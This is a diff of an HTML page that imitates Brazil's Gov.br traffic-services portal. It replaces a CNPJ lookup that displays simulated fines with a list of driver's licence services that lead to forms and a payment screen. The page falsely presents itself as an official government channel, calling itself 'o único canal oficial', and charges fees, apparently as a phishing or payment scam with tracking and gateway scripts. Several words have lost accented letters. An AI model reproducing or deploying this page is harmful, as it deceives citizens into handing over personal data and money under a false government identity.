@@ -1,411 +1,93 @@
-<!DOCTYPE html><html lang="pt-BR">
-<head>
+
+<!DOCTYPE html><html lang="pt-BR"><head>
   <!-- Google tag (gtag.js) -->
-  <script async src="https://www.googletagmanager.com/gtag/js?id=G-CYPSPHG7"></script>
-  <script>
-    window.dataLayer = window.dataLayer || [];
-    function gtag(){dataLayer.push(arguments);}
-    gtag("js", new Date());
-    gtag("config", "G-CYPSPHG7VD");
-  </script>
-  
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-CYPS"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-CYPSPHG7VD');
+</script>
   <!-- Google tag (gtag.js) -->
-  <script async src="https://www.googletagmanager.com/gtag/js?id=AW-169817808"></script>
-  <script>
-    window.dataLayer = window.dataLayer || [];
-    function gtag(){dataLayer.push(arguments);}
-    gtag("js", new Date());
-    gtag("config", "AW-16981780854");
-  </script>
-  
-  <title>Portal de Serviços de Trânsito | Gov.br</title>
-  <meta name="description" content="Emissão da 1a ou 2a via da Carteira de Identidade (RG), Carteira Nacional de Habilitação (CNH) disponível nos modelos cédula em papel moeda e cartão de policarbonato.">
-  <meta name="keywords" content="rg, cnh, segunda via, tirar documento">
-  <meta name="author" content="Gov.br">
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="theme-color" content="#FFFFFF">
-  <meta name="apple-mobile-web-app-status-bar-style" content="#FFFFFF">
-  <meta name="msapplication-navbutton-color" content="#FFFFFF">
-  
-  <!-- Open Graph -->
-  <meta property="og:title" content="Portal de Serviços de Trânsito | Gov.br">
-  <meta property="og:description" content="Emissão da 1a ou 2a via da Carteira de Identidade (RG), Carteira Nacional de Habilitação (CNH).">
-  <meta property="og:url" content="#">
-  <meta property="og:type" content="website">
-  <meta property="og:image" content="images/brasao.png">
-  
-  <!-- Favicons -->
-  <link rel="shortcut icon" href="images/favicon.png">
-  <link rel="icon" href="images/favicon.png" sizes="32x32">
-  <link rel="icon" href="images/favicon.png" sizes="192x192">
-  <link rel="apple-touch-icon" href="images/favicon.png">
-  <meta name="msapplication-TileImage" content="images/favicon.png">
-  
-  <!-- CSS -->
-  <link href="css/bootstrap.min.css" rel="stylesheet">
-  <!-- Font Awesome CDN - SOLUÇÃO PARA OS ÍCONES -->
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw==" crossorigin="anonymous" referrerpolicy="no-referrer">
-  <link rel="stylesheet" href="css/toastify.min.css">
-  <link href="css/style.css" rel="stylesheet">
-  
-  <!-- Scripts -->
-  <script src="js/lates.js" data-utmify-prevent-subids="" async defer></script>
-  
-  <!-- JavaScript para consulta CNPJ -->
-  <script>
-    document.addEventListener("DOMContentLoaded", function() {
-        function salvarParametrosNoLocalStorage() {
-            const params = new URLSearchParams(window.location.search);
-            const googleData = {};
-            googleData.utm_source = 'organic';
-            params.forEach((value, key) => {
-                googleData[key] = value;
-            });
-            localStorage.setItem('google', JSON.stringify(googleData));
-            console.log(googleData);
-        }
-        salvarParametrosNoLocalStorage();
-        
-        // Função para formatar CNPJ
-        function formatarCNPJ(cnpj) {
-            cnpj = cnpj.replace(/\D/g, '');
-            cnpj = cnpj.replace(/^(\d{2})(\d)/, '$1.$2');
-            cnpj = cnpj.replace(/^(\d{2})\.(\d{3})(\d)/, '$1.$2.$3');
-            cnpj = cnpj.replace(/\.(\d{3})(\d)/, '.$1/$2');
-            cnpj = cnpj.replace(/(\d{4})(\d)/, '$1-$2');
-            return cnpj;
-        }
-        
-        // Função para validar CNPJ
-        function validarCNPJ(cnpj) {
-            cnpj = cnpj.replace(/[^\d]+/g,'');
-            if(cnpj == '') return false;
-            if (cnpj.length != 14) return false;
-            
-            // Elimina CNPJs invalidos conhecidos
-            if (cnpj == "00000000000000" || 
-                cnpj == "11111111111111" || 
-                cnpj == "22222222222222" || 
-                cnpj == "33333333333333" || 
-                cnpj == "44444444444444" || 
-                cnpj == "55555555555555" || 
-                cnpj == "66666666666666" || 
-                cnpj == "77777777777777" || 
-                cnpj == "88888888888888" || 
-                cnpj == "99999999999999")
-                return false;
-                
-            // Valida DVs
-            var tamanho = cnpj.length - 2
-            var numeros = cnpj.substring(0,tamanho);
-            var digitos = cnpj.substring(tamanho);
-            var soma = 0;
-            var pos = tamanho - 7;
-            for (var i = tamanho; i >= 1; i--) {
-              soma += numeros.charAt(tamanho - i) * pos--;
-              if (pos < 2)
-                    pos = 9;
-            }
-            var resultado = soma % 11 < 2 ? 0 : 11 - soma % 11;
-            if (resultado != digitos.charAt(0))
-                return false;
-                
-            tamanho = tamanho + 1;
-            numeros = cnpj.substring(0,tamanho);
-            soma = 0;
-            pos = tamanho - 7;
-            for (var i = tamanho; i >= 1; i--) {
-              soma += numeros.charAt(tamanho - i) * pos--;
-              if (pos < 2)
-                    pos = 9;
-            }
-            resultado = soma % 11 < 2 ? 0 : 11 - soma % 11;
-            if (resultado != digitos.charAt(1))
-                  return false;
-                  
-            return true;
-        }
-        
-        // Aplicar máscara no campo CNPJ
-        const cnpjInput = document.getElementById('cnpj-input');
-        cnpjInput.addEventListener('input', function(e) {
-            e.target.value = formatarCNPJ(e.target.value);
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=AW-169817"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'AW-16981780854');
+</script>
+<title>Portal de Serviços de Trânsito | Gov.br</title>
+<meta name="description" content="Emissão da 1a ou 2a via da Carteira de Identidade (RG), Carteira Nacional de Habilitação (CNH) disponível nos modelos cédula em papel moeda e cartão de policarbonato. Estes são documentos de identificação civil emitido pelos rgãos de segurança dos Estados da Federação e pelo Distrito Federal.">
+<meta name="keywords" content="rg, cnh, segunda via, tirar documento">
+<meta name="author" content="Gov.br">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="apple-mobile-web-app-status-bar-style" content="#FFFFFF">
+<meta name="msapplication-navbutton-color" content="#FFFFFF">
+<meta property="og:title" content="Portal de Serviços de Trânsito | Gov.br">
+<meta property="og:description" content="Emisso da 1a ou 2a via da Carteira de Identidade (RG), Carteira Nacional de Habilitação (CNH) disponível nos modelos cédula em papel moeda e cartão de policarbonato. Estes são documentos de identificação civil emitido pelos órgãos de segurana dos Estados da Federação e pelo Distrito Federal.">
+<meta property="og:url" content="#">
+<meta property="og:type" content="website">
+<meta property="og:image" content="images/brasao.png">
+<link rel="shortcut icon" href="images/favicon.png">
+<link rel="icon" href="images/favicon.png" sizes="32x32">
+<link rel="icon" href="images/favicon.png" sizes="192x192">
+<link rel="apple-touch-icon" href="images/favicon.png">
+<meta name="msapplication-TileImage" content="images/favicon.png">
+<link href="css/bootstrap.min.css" rel="stylesheet">
+<link href="css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="css/toastify.min.css">
+<link href="css/style.css" rel="stylesheet">
+<script src="js/la.js" data-utmify-prevent-subids="" async="" defer=""></script>
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    function salvarParametrosNoLocalStorage() {
+        const params = new URLSearchParams(window.location.search);
+        const googleData = {};
+
+        googleData.utm_source = 'organic';
+
+        params.forEach((value, key) => {
+            googleData[key] = value;
         });
+
+        localStorage.setItem('google', JSON.stringify(googleData));
+        console.log(googleData);
+    }
+    salvarParametrosNoLocalStorage();
+    
+    const google= JSON.parse(localStorage.getItem('google')) || {};
+    const params = Object.entries(google)
+        .map(([key, value]) => `${encodeURIComponent(key)}=${encodeURIComponent(value)}`)
+        .join('&');
         
-        // Função para simular consulta de pendências
-        function consultarPendencias() {
-            const cnpj = document.getElementById('cnpj-input').value;
-            const resultadoDiv = document.getElementById('resultado-consulta');
-            const loadingDiv = document.getElementById('loading-consulta');
-            
-            if (!cnpj) {
-                alert('Por favor, digite um CNPJ válido.');
-                return;
-            }
-            
-            if (!validarCNPJ(cnpj)) {
-                alert('CNPJ inválido. Por favor, verifique os dados digitados.');
-                return;
-            }
-            
-            // Mostrar loading
-            loadingDiv.style.display = 'block';
-            resultadoDiv.style.display = 'none';
-            
-            // Simular delay da consulta
-            setTimeout(function() {
-                loadingDiv.style.display = 'none';
-                
-                // Dados simulados baseados no CNPJ
-                const cnpjLimpo = cnpj.replace(/\D/g, '');
-                const empresasSimuladas = {
-                    '11222333000181': {
-                        razaoSocial: 'EMPRESA EXEMPLO LTDA',
-                        nomeFantasia: 'Exemplo Transportes',
-                        situacao: 'ATIVA',
-                        dataAbertura: '15/03/2010',
-                        endereco: 'RUA DAS FLORES, 123 - CENTRO - SÃO PAULO/SP',
-                        pendencias: [
-                            { tipo: 'Multa de Trânsito', valor: 'R$ 195,23', vencimento: '15/12/2024' },
-                            { tipo: 'Taxa de Licenciamento', valor: 'R$ 87,38', vencimento: '31/01/2025' }
-                        ]
-                    },
-                    '22333444000195': {
-                        razaoSocial: 'TRANSPORTADORA ABC S/A',
-                        nomeFantasia: 'ABC Logística',
-                        situacao: 'ATIVA',
-                        dataAbertura: '22/08/2005',
-                        endereco: 'AV. BRASIL, 456 - INDUSTRIAL - RIO DE JANEIRO/RJ',
-                        pendencias: []
-                    }
-                };
-                
-                // Usar dados simulados ou gerar dados genéricos
-                let dadosEmpresa;
-                if (empresasSimuladas[cnpjLimpo]) {
-                    dadosEmpresa = empresasSimuladas[cnpjLimpo];
-                } else {
-                    // Gerar dados genéricos para qualquer CNPJ válido
-                    dadosEmpresa = {
-                        razaoSocial: 'EMPRESA CONSULTADA LTDA',
-                        nomeFantasia: 'Empresa Consultada',
-                        situacao: 'ATIVA',
-                        dataAbertura: '01/01/2015',
-                        endereco: 'RUA EXEMPLO, 789 - CENTRO - BRASÍLIA/DF',
-                        pendencias: Math.random() > 0.5 ? [
-                            { tipo: 'Multa de Trânsito', valor: 'R$ 130,16', vencimento: '20/01/2025' }
-                        ] : []
-                    };
-                }
-                
-                // Exibir resultado
-                document.getElementById('empresa-razao').textContent = dadosEmpresa.razaoSocial;
-                document.getElementById('empresa-fantasia').textContent = dadosEmpresa.nomeFantasia;
-                document.getElementById('empresa-cnpj').textContent = cnpj;
-                document.getElementById('empresa-situacao').textContent = dadosEmpresa.situacao;
-                document.getElementById('empresa-abertura').textContent = dadosEmpresa.dataAbertura;
-                document.getElementById('empresa-endereco').textContent = dadosEmpresa.endereco;
-                
-                const pendenciasDiv = document.getElementById('pendencias-lista');
-                if (dadosEmpresa.pendencias.length > 0) {
-                    let pendenciasHtml = '';
-                    dadosEmpresa.pendencias.forEach(function(pendencia) {
-                        pendenciasHtml += `
-                            <div class="pendencia-item">
-                                <div class="pendencia-info">
-                                    <strong>${pendencia.tipo}</strong>
-                                    <span>Valor: ${pendencia.valor}</span>
-                                    <span>Vencimento: ${pendencia.vencimento}</span>
-                                </div>
-                                <div class="pendencia-status">
-                                    <span class="badge badge-warning">PENDENTE</span>
-                                </div>
-                            </div>
-                        `;
-                    });
-                    pendenciasDiv.innerHTML = pendenciasHtml;
-                    document.getElementById('sem-pendencias').style.display = 'none';
-                } else {
-                    pendenciasDiv.innerHTML = '';
-                    document.getElementById('sem-pendencias').style.display = 'block';
-                }
-                
-                resultadoDiv.style.display = 'block';
-            }, 2000);
-        }
-        
-        // Adicionar evento ao botão
-        document.getElementById('consultar-btn').addEventListener('click', consultarPendencias);
-        
-        // Permitir consulta ao pressionar Enter
-        cnpjInput.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                consultarPendencias();
-            }
-        });
+    var novaUrl1 = './pagina1/';
+    var novaUrl2 = './pagina2/';
+    var novaUrl3 = './pagina3/';
+    var novaUrl4 = './pagina4/';
+    var novaUrl5 = './pagina5/';
+    
+    document.getElementById('service1').addEventListener('click', function() {
+        window.location.href = novaUrl1;
     });
-  </script>
-  
-  <style>
-    .consulta-cnpj {
-        background: #f8f9fa;
-        padding: 30px;
-        border-radius: 8px;
-        margin-bottom: 30px;
-    }
-    
-    .form-group {
-        margin-bottom: 20px;
-    }
-    
-    .form-group label {
-        display: block;
-        margin-bottom: 8px;
-        font-weight: 600;
-        color: #333;
-    }
-    
-    .form-control {
-        width: 100%;
-        padding: 12px 15px;
-        border: 2px solid #ddd;
-        border-radius: 6px;
-        font-size: 16px;
-        transition: border-color 0.3s;
-    }
-    
-    .form-control:focus {
-        outline: none;
-        border-color: #007bff;
-        box-shadow: 0 0 0 3px rgba(0,123,255,0.1);
-    }
-    
-    .btn-consultar {
-        background: #28a745;
-        color: white;
-        padding: 12px 30px;
-        border: none;
-        border-radius: 6px;
-        font-size: 16px;
-        font-weight: 600;
-        cursor: pointer;
-        transition: background-color 0.3s;
-    }
-    
-    .btn-consultar:hover {
-        background: #218838;
-    }
-    
-    .loading-consulta {
-        text-align: center;
-        padding: 20px;
-        display: none;
-    }
-    
-    .loading-consulta img {
-        width: 50px;
-        height: 50px;
-    }
-    
-    .resultado-consulta {
-        display: none;
-        background: white;
-        border: 1px solid #ddd;
-        border-radius: 8px;
-        padding: 25px;
-        margin-top: 20px;
-    }
-    
-    .empresa-info {
-        background: #f8f9fa;
-        padding: 20px;
-        border-radius: 6px;
-        margin-bottom: 20px;
-    }
-    
-    .empresa-info h4 {
-        color: #007bff;
-        margin-bottom: 15px;
-    }
-    
-    .info-row {
-        display: flex;
-        margin-bottom: 8px;
-    }
-    
-    .info-label {
-        font-weight: 600;
-        min-width: 120px;
-        color: #555;
-    }
-    
-    .info-value {
-        color: #333;
-    }
-    
-    .pendencias-section h4 {
-        color: #dc3545;
-        margin-bottom: 15px;
-    }
-    
-    .pendencia-item {
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        padding: 15px;
-        border: 1px solid #ddd;
-        border-radius: 6px;
-        margin-bottom: 10px;
-        background: #fff;
-    }
-    
-    .pendencia-info strong {
-        display: block;
-        color: #333;
-        margin-bottom: 5px;
-    }
-    
-    .pendencia-info span {
-        display: block;
-        color: #666;
-        font-size: 14px;
-    }
-    
-    .badge {
-        padding: 5px 10px;
-        border-radius: 4px;
-        font-size: 12px;
-        font-weight: 600;
-        text-transform: uppercase;
-    }
-    
-    .badge-warning {
-        background: #ffc107;
-        color: #212529;
-    }
-    
-    .badge-success {
-        background: #28a745;
-        color: white;
-    }
-    
-    .sem-pendencias {
-        text-align: center;
-        padding: 30px;
-        color: #28a745;
-        font-size: 18px;
-        font-weight: 600;
-    }
-    
-    .sem-pendencias i {
-        font-size: 48px;
-        margin-bottom: 15px;
-        display: block;
-    }
-  </style>
+    document.getElementById('service2').addEventListener('click', function() {
+        window.location.href = novaUrl2;
+    });
+    document.getElementById('service3').addEventListener('click', function() {
+        window.location.href = novaUrl3;
+    });
+    document.getElementById('service4').addEventListener('click', function() {
+        window.location.href = novaUrl4;
+    });
+    document.getElementById('service5').addEventListener('click', function() {
+        window.location.href = novaUrl5;
+    });
+});
+</script>
 </head>
-  
 <body><header id="site-header">
     <div class="header-wrapper container">
         <div class="br-header">
@@ -419,7 +101,7 @@
                         <ul class=" links-governo svelte-19kdt9x">
                             <li class="titulo svelte-19kdt9x">Acesso Rápido</li>
                             <li class="svelte-19kdt9x"><a href="#" class="svelte-19kdt9x">Órgãos do Governo</a></li>
-                            <li class="svelte-19kdt9x"><a href="#" class="svelte-19kdt9x">Acesso à Informação</a></li>
+                            <li class="svelte-19kdt9x"><a href="#" class="svelte-19kdt9x">Acesso à Informaão</a></li>
                             <li class="svelte-19kdt9x"><a href="#" class="svelte-19kdt9x">Legislação</a></li>
                             <li class="svelte-19kdt9x"><a href="#" class="svelte-19kdt9x">Acessibilidade</a></li>
                         </ul>
@@ -484,7 +166,7 @@
                         <input class="aa-Input" aria-autocomplete="both" aria-labelledby="searchtext-label" id="searchtext-input" autocomplete="off" autocorrect="off" autocapitalize="none" enterkeyhint="search" spellcheck="false" placeholder="O que você procura?" maxlength="512" type="search">
                     </div>
                     <div class="aa-InputWrapperSuffix">
-                        <button class="aa-ClearButton" type="reset" title="Clear" hidden=""><svg class="aa-ClearIcon" viewBox="0 0 24 24" width="18" height="18" fill="currentColor"><path d="M5.293 6.707l5.293 5.293-5.293 5.293c-0.391 0.391-0.391 1.024 0 1.414s1.024 0.391 1.414 0l5.293-5.293 5.293 5.293c0.391 0.391 1.024 0.391 1.414 0s0.391-1.024 0-1.414l-5.293-5.293 5.293-5.293c-0.391-0.391-1.024-0.391-1.414 0s-0.391 1.024 0 1.414z"></path></svg></button>
+                        <button class="aa-ClearButton" type="reset" title="Clear" hidden=""><svg class="aa-ClearIcon" viewBox="0 0 24 24" width="18" height="18" fill="currentColor"><path d="M5.293 6.707l5.293 5.293-5.293 5.293c-0.391 0.391-0.391 1.024 0 1.414s1.024 0.391 1.414 0l5.293-5.293 5.293 5.293c0.391 0.391 1.024 0.391 1.414 0s0.391-1.024 0-1.414l-5.293-5.293 5.293-5.293c0.391-0.391 0.391-1.024 0-1.414s-1.024-0.391-1.414 0l-5.293 5.293-5.293-5.293c-0.391-0.391-1.024-0.391-1.414 0s-0.391 1.024 0 1.414z"></path></svg></button>
                     </div>
                 </form>
             </div>
@@ -519,128 +201,131 @@
 <section id="inicio">
     <div class="container">
         <div class="servicos">
-            <h2>Consulta de Pendências</h2>
+            <h2>Serviços Disponíveis</h2>
             <div class="card-servicos">
                 <div class="content-card">
-                    <div class="consulta-cnpj">
-                        <h3><i class="fas fa-search"></i> Consultar Pendências por CNPJ</h3>
-                        <p>Digite o CNPJ da empresa para consultar pendências de trânsito e documentação.</p>
-                        
-                        <div class="form-group">
-                            <label for="cnpj-input">CNPJ da Empresa:</label>
-                            <input type="text" id="cnpj-input" class="form-control" placeholder="00.000.000/0000-00" maxlength="18">
-                        </div>
-                        
-                        <button type="button" id="consultar-btn" class="btn-consultar">
-                            <i class="fas fa-search"></i> Consultar Agora
-                        </button>
-                        
-                        <div id="loading-consulta" class="loading-consulta">
-                            <img src="images/loading.svg" alt="Carregando">
-                            <p>Consultando pendências...</p>
-                        </div>
-                        
-                        <div id="resultado-consulta" class="resultado-consulta">
-                            <div class="empresa-info">
-                                <h4><i class="fas fa-building"></i> Informações da Empresa</h4>
-                                <div class="info-row">
-                                    <span class="info-label">Razão Social:</span>
-                                    <span class="info-value" id="empresa-razao">-</span>
-                                </div>
-                                <div class="info-row">
-                                    <span class="info-label">Nome Fantasia:</span>
-                                    <span class="info-value" id="empresa-fantasia">-</span>
-                                </div>
-                                <div class="info-row">
-                                    <span class="info-label">CNPJ:</span>
-                                    <span class="info-value" id="empresa-cnpj">-</span>
-                                </div>
-                                <div class="info-row">
-                                    <span class="info-label">Situação:</span>
-                                    <span class="info-value" id="empresa-situacao">-</span>
-                                </div>
-                                <div class="info-row">
-                                    <span class="info-label">Data de Abertura:</span>
-                                    <span class="info-value" id="empresa-abertura">-</span>
-                                </div>
-                                <div class="info-row">
-                                    <span class="info-label">Endereço:</span>
-                                    <span class="info-value" id="empresa-endereco">-</span>
-                                </div>
+                    <h3>Selecione o serviço desejado:</h3>
+                    <div class="servico">
+                        <a href="javascript:void(0)" id="service1" class="content-servico d-flex align-items-center justify-content-between">
+                            <div class="texto">
+                                <strong>CNH - Primeira Via</strong>
+                                <span>Solicite sua primeira Carteira Nacional de Habilitação</span>
                             </div>
-                            
-                            <div class="pendencias-section">
-                                <h4><i class="fas fa-exclamation-triangle"></i> Pendências Encontradas</h4>
-                                <div id="pendencias-lista"></div>
-                                <div id="sem-pendencias" class="sem-pendencias" style="display: none;">
-                                    <i class="fas fa-check-circle"></i>
-                                    Nenhuma pendência encontrada para esta empresa.
-                                </div>
+                            <div class="icone"><i class="fa-solid fa-arrow-right"></i></div>
+                        </a>
+                    </div>
+                    <div class="servico">
+                        <a href="javascript:void(0)" id="service2" class="content-servico d-flex align-items-center justify-content-between">
+                            <div class="texto">
+                                <strong>CNH - Renovação</strong>
+                                <span>Renove sua Carteira Nacional de Habilitação</span>
                             </div>
-                        </div>
+                            <div class="icone"><i class="fa-solid fa-arrow-right"></i></div>
+                        </a>
+                    </div>
+                    <div class="servico">
+                        <a href="javascript:void(0)" id="service3" class="content-servico d-flex align-items-center justify-content-between">
+                            <div class="texto">
+                                <strong>CNH - Segunda Via</strong>
+                                <span>Solicite a segunda via da sua Carteira Nacional de Habilitação</span>
+                            </div>
+                            <div class="icone"><i class="fa-solid fa-arrow-right"></i></div>
+                        </a>
+                    </div>
+                    <div class="servico">
+                        <a href="javascript:void(0)" id="service4" class="content-servico d-flex align-items-center justify-content-between">
+                            <div class="texto">
+                                <strong>CNH - Adição de Categoria</strong>
+                                <span>Adicione novas categorias à sua Carteira Nacional de Habilitação</span>
+                            </div>
+                            <div class="icone"><i class="fa-solid fa-arrow-right"></i></div>
+                        </a>
+                    </div>
+                    <div class="servico">
+                        <a href="javascript:void(0)" id="service5" class="content-servico d-flex align-items-center justify-content-between">
+                            <div class="texto">
+                                <strong>Permisso Internacional para Dirigir (PID)</strong>
+                                <span>Solicite a PID e tenha o direito de dirigir no exterior</span>
+                            </div>
+                            <div class="icone"><i class="fa-solid fa-arrow-right"></i></div>
+                        </a>
                     </div>
                 </div>
             </div>
         </div>
         <div class="como-solicitar">
-            <h2>Como funciona a consulta?</h2>
+            <h2>Como solicitar o agendamento online?</h2>
             <div class="cards-como d-flex align-items-stretch justify-content-between flex-wrap">
                 <div class="card-como">
                     <div class="content-card">
-                        <div class="icone"><i class="fa-solid fa-edit"></i></div>
-                        <h3>Digite o CNPJ</h3>
-                        <p>Insira o CNPJ da empresa no campo acima. O sistema aplicará automaticamente a formatação correta.</p>
+                        <div class="icone"><i class="fa-solid fa-user-tie"></i></div>
+                        <h3>Preencha o formulário</h3>
+                        <p>Clique no botão inicial para ter acesso ao formulário. Preencha seus dados até o fim para chegar na tela de pagamento.</p>
                     </div>
                 </div>
                 <div class="card-como">
                     <div class="content-card">
-                        <div class="icone"><i class="fa-solid fa-search"></i></div>
-                        <h3>Consulte as pendências</h3>
-                        <p>Clique em "Consultar Agora" para verificar se existem pendências de trânsito para a empresa.</p>
+                        <div class="icone"><i class="fa-solid fa-money-bill-wave"></i></div>
+                        <h3>Realize o pagamento</h3>
+                        <p>Realize o pagamento do pedido. Após compensado o pagamento, ir receber um e-mail de confirmaão.</p>
                     </div>
                 </div>
                 <div class="card-como">
                     <div class="content-card">
-                        <div class="icone"><i class="fa-solid fa-file-alt"></i></div>
-                        <h3>Visualize os resultados</h3>
-                        <p>Veja as informações da empresa e todas as pendências encontradas, com valores e datas de vencimento.</p>
+                        <div class="icone"><i class="fa-solid fa-envelope"></i></div>
+                        <h3>Receba tudo por e-mail</h3>
+                        <p>Após o confirmado seu pagamento, iremos entrar em contato por e-mail em até 5 dias úteis.</p>
                     </div>
                 </div>
+            </div>
+        </div>
+        <div class="duvidas">
+            <h2>Dúvidas frequentes</h2>
+            <div class="duvida">
+                <h4 data-bs-toggle="collapse" href="#collapse01" role="button" aria-expanded="false" aria-controls="collapse01">Quanto tempo demora para receber a confirmação do protocolo de agendamento por e-mail?<i class="fa-solid fa-chevron-down"></i></h4>
+                <p class="collapse" id="collapse01">O e-mail com a confirmação do protocolo de seu atendimento chega em até 48 horas após a confirmação de pagamento.</p>
+            </div>
+            <div class="duvida">
+                <h4 data-bs-toggle="collapse" href="#collapse02" role="button" aria-expanded="false" aria-controls="collapse02">Depois que agendei já posso ir ao posto de atendimento?<i class="fa-solid fa-chevron-down"></i></h4>
+                <p class="collapse" id="collapse02">Não. Só vá ao posto de atendimento com o protocolo de atendimento que enviaremos ao seu e-mail. Este protocolo é a confirmação de que o dia e horário desejado foi devidamente agendado com o posto.</p>
+            </div>
+            <div class="duvida">
+                <h4 data-bs-toggle="collapse" href="#collapse03" role="button" aria-expanded="false" aria-controls="collapse03">Alm da taxa de serviço será cobrado mais algum valor?<i class="fa-solid fa-chevron-down"></i></h4>
+                <p class="collapse" id="collapse03">Para emissão de 1ª via não há outras taxas. Entretando, se for emissão de 2ª via do documento, será cobrado uma taxa de emissão.</p>
+            </div>
+            <div class="duvida">
+                <h4 data-bs-toggle="collapse" href="#collapse04" role="button" aria-expanded="false" aria-controls="collapse04">Posso desistir após pagar?<i class="fa-solid fa-chevron-down"></i></h4>
+                <p class="collapse" id="collapse04">Sim! Caso o servio ainda não tenha sido realizado, basta entrar em contato em nossos canais de atendimento que faremos o estorno.</p>
+            </div>
+            <div class="duvida">
+                <h4 class="collapse" data-bs-toggle="collapse" href="#collapse05" role="button" aria-expanded="false" aria-controls="collapse05">Posso realizar o agendamento sem a assessoria do site?<i class="fa-solid fa-chevron-down"></i></h4>
+                <p class="collapse" id="collapse05">Não. Este  o único canal oficial para realizar o agendamento dos seus documentos. Para sua segurança e garantia do serviço, realize o agendamento somente através deste portal governamental.</p>
             </div>
         </div>
     </div>
 </section>
-
-<footer id="site-footer">
+<footer>
     <div class="container">
-        <div class="footer-content">
-            <div class="footer-section">
-                <h4>Portal de Serviços</h4>
-                <p>Acesso rápido e seguro aos serviços de trânsito do governo federal.</p>
-            </div>
-            <div class="footer-section">
-                <h4>Links Úteis</h4>
-                <ul>
-                    <li><a href="#">Órgãos do Governo</a></li>
-                    <li><a href="#">Acesso à Informação</a></li>
-                    <li><a href="#">Legislação</a></li>
-                    <li><a href="#">Acessibilidade</a></li>
-                </ul>
-            </div>
-            <div class="footer-section">
-                <h4>Contato</h4>
-                <p>Central de Atendimento: 0800 123 4567</p>
-                <p>Horário: Segunda a Sexta, 8h às 18h</p>
-            </div>
+        <div class="logo-rodape">
+            <img src="images/govbr.png" alt="Gov.br">
         </div>
-        <div class="footer-bottom">
-            <p>&copy; 2024 Portal de Serviços de Trânsito - Governo Federal</p>
+        <span>2025 Portal de Serviços de Trânsito. Todos os direitos reservados</span>
+        <div class="links-rodape">
+            <a href="#">Política de privacidade</a>
+            <a href="#">Termos de uso</a>
+        </div>
+    </div>
+    <div class="copy">
+        <div class="container">
+            <span>Todo o conteúdo deste site está publicado sob a licença <a href="#">Creative Commons Atribuição-SemDerivações 3.0 Não Adaptada.</a></span>
         </div>
     </div>
 </footer>
+<script src="js/jquery.min.js"></script>
+<script src="js/bootstrap.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/toastify-js"></script>
+<script src="js/jquery.mask.min.js"></script>
+<script src="js/functions.js"></script>
+<script src="js/gateway.js"></script>
 
-<script src="js/bootstrap.bundle.min.js"></script>
-<script src="js/toastify.min.js"></script>
-</body>
-</html>
-
+</body></html>
